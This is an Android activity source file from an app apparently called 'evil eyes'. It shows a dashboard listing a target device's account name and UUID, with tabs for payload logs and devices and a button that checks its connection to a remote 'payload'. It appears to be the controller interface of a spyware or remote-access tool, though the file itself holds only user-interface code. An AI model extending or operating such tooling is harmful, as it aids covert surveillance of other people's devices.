package evil.eyes.ui;

import static evil.eyes.R.*;

import android.annotation.SuppressLint;
import android.content.Intent;
import android.os.Bundle;
import android.speech.tts.TextToSpeech;
import android.view.View;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.PopupMenu;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.AppCompatButton;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentManager;
import androidx.fragment.app.FragmentPagerAdapter;
import androidx.viewpager.widget.ViewPager;

import com.google.android.material.snackbar.Snackbar;
import com.google.android.material.tabs.TabLayout;
import com.google.firebase.auth.FirebaseAuth;

import java.util.ArrayList;
import java.util.List;
import java.util.Locale;

import evil.eyes.MainActivity;
import evil.eyes.R;
import evil.eyes.core.DeviceConfig;
import evil.eyes.core.helpers.PayloadConnection;
import evil.eyes.core.interfaces.PayloadConnectionListner;
import evil.eyes.core.interfaces.onRestart;
import evil.eyes.core.models.Devices;
import evil.eyes.ui.fragments.HomeContent;
import evil.eyes.ui.fragments.Logs;
import evil.eyes.ui.fragments.Recents;
import evil.eyes.ui.fragments.Schedule;
import evil.eyes.ui.fragments.Stats;

public class Home extends AppCompatActivity implements onRestart {

    private TabLayout tabLayout;
    public static ViewPager viewPager;
    public static onRestart onRestart;

    private LinearLayout linearLayout;
    private ImageView dropDown;
    private TextToSpeech t1;
    private AppCompatButton set_device;


    @SuppressLint("NonConstantResourceId")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(layout.activity_home);
        onRestart = this;

        tabLayout = findViewById(id.tabLayout);
        viewPager = findViewById(id.viewPager);
        linearLayout = findViewById(id.container);
        dropDown = findViewById(id.dropdown_menu);
        set_device = findViewById(id.set_device);
        TextView selected_name = findViewById(id.selected_name);
        TextView device_uuid = findViewById(id.device_uuid);
        Devices selected_Device = DeviceConfig.getInstance(this).initializeStorage().getSelectedDevice();

        t1 = new TextToSpeech(this, status -> {
            if(status != TextToSpeech.ERROR) {
                t1.setLanguage(Locale.US);
            }
        });

        selected_name.setText(selected_Device.getPrimaryAccountName());
        device_uuid.setText(selected_Device.getUUID());

        setupTabs();
        findViewById(id.cPaye).setOnClickListener(l -> {
            checkPayloadConnection();
        });

        dropDown.setOnClickListener(o->{
            PopupMenu popupMenu = new PopupMenu(Home.this, dropDown);

            // Inflating popup menu from popup_menu.xml file
            popupMenu.getMenuInflater().inflate(menu.menu_home, popupMenu.getMenu());

            popupMenu.setOnMenuItemClickListener(menuItem -> {
                // Toast message on menu item clicked
                switch (menuItem.getItemId()){
                    case id.react_native :
                        //Logout button
                        FirebaseAuth.getInstance().signOut();
                        startActivity(new Intent(Home.this, LoginActivity.class));
                        finish();
                        break;
                    case id.android :
                        //About us button
                        new AlertDialog.Builder(Home.this)
                                .setTitle("About")
                                .setView(layout.dialog_layout)
                                .setPositiveButton("OK",(r,i)->r.dismiss())
                                .setCancelable(false)
                                .show();
                        break;
                    case id.kotlin :
                        //Disclaimer
                        break;
                    case id.java:
                        break;

                }
                return true;
            });
            // Showing the popup menu
            popupMenu.show();
        });

    }


    private void checkPayloadConnection() {
        final AlertDialog[] alertDialog = {null};
        alertDialog[0] = new AlertDialog.Builder(Home.this)
                .setMessage("Waiting for payload response")
                .create();
        alertDialog[0].show();

        PayloadConnection
                .initializePayloadConnection()
                .checkPayloadConnection(new PayloadConnectionListner() {
            @Override
            public void onConnectionSuccessful() {
                t1.speak("Connection Established with the payload", TextToSpeech.QUEUE_FLUSH, null);
                new AlertDialog.Builder(Home.this)
                        .setMessage("Payload connection successful :)")
                        .setPositiveButton("OK", (l, o) -> {
                            l.dismiss();
                            if (alertDialog[0] != null)
                                alertDialog[0].dismiss();


                        })
                        .show();

            }

            @Override
            public void onPayloadError(String message) {
                t1.speak("Failed to connect to the server.", TextToSpeech.QUEUE_FLUSH, null);

                Snackbar.make(linearLayout, "Failed to connect to the server.", Snackbar.LENGTH_LONG)
                        .setAction("DISMISS", v -> {
                        }).show();
            }
        });
    }

    private synchronized void setupTabs() {
        tabLayout.addTab(tabLayout.newTab().setText("Home"));
        tabLayout.addTab(tabLayout.newTab().setText("Recent Activity"));
        tabLayout.addTab(tabLayout.newTab().setText("Schedule"));
        tabLayout.addTab(tabLayout.newTab().setText("Payload Logs"));
        tabLayout.addTab(tabLayout.newTab().setText("Devices"));

        gettabs(0);

        /*Bundle bundle = new Bundle();
        bundle = getArguments();
        if (bundle !=null){
            pos = (Integer) bundle.get("pos");
            gettabs(pos);
        }else{
            pos = 0;
            gettabs(pos);
        } */
    }

    private void gettabs(Integer pos) {
        ViewPagerAdapter viewPagerAdapter;
        viewPagerAdapter = new ViewPagerAdapter(getSupportFragmentManager());
        viewPagerAdapter.addFragment(new HomeContent(), "Home");
        viewPagerAdapter.addFragment(new Recents(), "Recent Activity");
        viewPagerAdapter.addFragment(new Schedule(), "Schedule");
        viewPagerAdapter.addFragment(new Logs(), "Payload Logs");
        viewPagerAdapter.addFragment(new Stats(), "Devices");

        viewPager.setAdapter(viewPagerAdapter);
        tabLayout.setupWithViewPager(viewPager);
        tabLayout.addOnTabSelectedListener(new TabLayout.OnTabSelectedListener() {
            @Override
            public void onTabSelected(TabLayout.Tab tab) {
                viewPager.setCurrentItem(tab.getPosition());
            }

            @Override
            public void onTabUnselected(TabLayout.Tab tab) {

            }

            @Override
            public void onTabReselected(TabLayout.Tab tab) {

            }
        });

        set_device.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                viewPager.setCurrentItem(4);
            }
        });
        if (pos != null)
            viewPager.setCurrentItem(pos);
    }

    @Override
    public void onRestartRequested() {
        Intent intent = new Intent(getApplicationContext(), MainActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
        startActivity(intent);
        finish();
    }

    class ViewPagerAdapter extends FragmentPagerAdapter {
        private final List<Fragment> mFragmentList = new ArrayList<>();
        private final List<String> mFragmentTitleList = new ArrayList<>();

        public ViewPagerAdapter(FragmentManager manager) {
            super(manager);
        }

        @Override
        public Fragment getItem(int position) {
            return mFragmentList.get(position);
        }

        @Override
        public int getCount() {
            return mFragmentList.size();
        }

        public void addFragment(Fragment fragment, String title) {
            mFragmentList.add(fragment);
            mFragmentTitleList.add(title);
        }

        @Override
        public CharSequence getPageTitle(int position) {
            return mFragmentTitleList.get(position);
        }
    }
}